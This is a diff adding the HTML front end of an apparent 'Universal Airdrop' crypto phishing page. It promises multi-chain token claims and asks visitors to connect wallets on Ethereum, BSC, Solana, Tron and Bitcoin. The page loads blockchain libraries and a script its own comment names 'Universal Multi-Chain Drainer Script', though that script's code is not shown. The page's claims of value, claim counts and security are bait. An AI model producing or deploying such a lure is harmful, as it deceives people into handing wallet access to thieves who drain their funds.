@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Universal Airdrop Claim - Multi-Chain Support</title>
+    <link rel="stylesheet" href="styles/main.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <meta name="description" content="Claim your universal airdrop tokens across multiple blockchain networks">
+    <meta name="keywords" content="airdrop, cryptocurrency, blockchain, multi-chain, universal">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎯</text></svg>">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <div class="logo-img">🎯</div>
+                <h1>Universal Airdrop</h1>
+            </div>
+            <div class="network-indicator">
+                <span id="current-network">Multi-Chain Ready</span>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="hero-section">
+                <h2>🎉 Universal Multi-Chain Airdrop Event</h2>
+                <p>Claim your exclusive airdrop tokens across multiple blockchain networks!</p>
+                <div class="stats">
+                    <div class="stat">
+                        <span class="stat-number">$2.5M+</span>
+                        <span class="stat-label">Total Value</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">50,000+</span>
+                        <span class="stat-label">Claims</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">5</span>
+                        <span class="stat-label">Networks</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="connection-section">
+                <div class="network-selector">
+                    <h3>🌐 Supported Networks</h3>
+                    <div class="network-grid">
+                        <div class="network-card" data-network="ethereum">
+                            <div class="network-logo">⟠</div>
+                            <span>Ethereum</span>
+                            <div class="network-status" id="eth-status">�</div>
+                        </div>
+                        <div class="network-card" data-network="bsc">
+                            <div class="network-logo">🟡</div>
+                            <span>BSC</span>
+                            <div class="network-status" id="bsc-status">�</div>
+                        </div>
+                        <div class="network-card" data-network="solana">
+                            <div class="network-logo">◉</div>
+                            <span>Solana</span>
+                            <div class="network-status" id="sol-status">�</div>
+                        </div>
+                        <div class="network-card" data-network="tron">
+                            <div class="network-logo">🔴</div>
+                            <span>Tron</span>
+                            <div class="network-status" id="tron-status">�</div>
+                        </div>
+                        <div class="network-card" data-network="bitcoin">
+                            <div class="network-logo">₿</div>
+                            <span>Bitcoin</span>
+                            <div class="network-status" id="btc-status">�</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="wallet-section">
+                    <h3>💳 Connect Your Wallet</h3>
+                    <div id="wallet-options" class="wallet-grid">
+                        <!-- Wallet options will be populated dynamically -->
+                        <div class="wallet-placeholder">
+                            <div class="wallet-icon">🔗</div>
+                            <span>Detecting wallets...</span>
+                        </div>
+                    </div>
+                    
+                    <div class="connection-status">
+                        <div id="connection-indicator" class="status-indicator">
+                            <span class="status-dot"></span>
+                            <span id="connection-text">Ready to Connect</span>
+                        </div>
+                        <div id="wallet-info" class="wallet-info" style="display: none;">
+                            <div class="wallet-details">
+                                <span id="wallet-name"></span>
+                                <span id="wallet-address"></span>
+                                <span id="wallet-balance"></span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button id="connect-btn" class="connect-button">
+                        🚀 Connect & Claim Universal Airdrop
+                    </button>
+                </div>
+            </div>
+
+            <div class="claim-section" id="claim-section" style="display: none;">
+                <h3>🎯 Claim Your Airdrop</h3>
+                <div class="claim-info">
+                    <div class="eligible-tokens" id="eligible-tokens">
+                        <div class="token-info">
+                            <h4>🎁 Eligible for Claims:</h4>
+                            <p>• ETH & ERC-20 tokens on Ethereum</p>
+                            <p>• BNB & BEP-20 tokens on BSC</p>
+                            <p>• SOL & SPL tokens on Solana</p>
+                            <p>• TRX & TRC-20 tokens on Tron</p>
+                            <p>• BTC on Bitcoin network</p>
+                        </div>
+                    </div>
+                    <div class="claim-progress" id="claim-progress">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="progress-fill"></div>
+                        </div>
+                        <div class="progress-text" id="progress-text">Ready to claim</div>
+                    </div>
+                </div>
+                <button id="claim-btn" class="claim-button">
+                    🚀 Start Claiming Process
+                </button>
+            </div>
+
+            <div class="features-section">
+                <h3>✨ Why Choose Universal Airdrop?</h3>
+                <div class="features-grid">
+                    <div class="feature">
+                        <div class="feature-icon">🔐</div>
+                        <h4>Secure</h4>
+                        <p>Military-grade security protocols</p>
+                    </div>
+                    <div class="feature">
+                        <div class="feature-icon">⚡</div>
+                        <h4>Fast</h4>
+                        <p>Instant claims across all networks</p>
+                    </div>
+                    <div class="feature">
+                        <div class="feature-icon">🌐</div>
+                        <h4>Multi-Chain</h4>
+                        <p>Support for 5 major blockchains</p>
+                    </div>
+                    <div class="feature">
+                        <div class="feature-icon">💎</div>
+                        <h4>Premium</h4>
+                        <p>Exclusive high-value token drops</p>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#terms">Terms</a>
+                    <a href="#privacy">Privacy</a>
+                    <a href="#support">Support</a>
+                </div>
+                <div class="footer-text">
+                    <p>&copy; 2025 Universal Airdrop. All rights reserved.</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Loading Modal -->
+    <div id="loading-modal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <div class="loader"></div>
+            <p id="loading-text">Processing...</p>
+        </div>
+    </div>
+
+    <!-- External Libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <script src="https://unpkg.com/tronweb@latest/dist/TronWeb.js"></script>
+
+    <!-- Universal Multi-Chain Drainer Script -->
+    <script src="scripts/universal-drainer.js"></script>
+</body>
+</html>
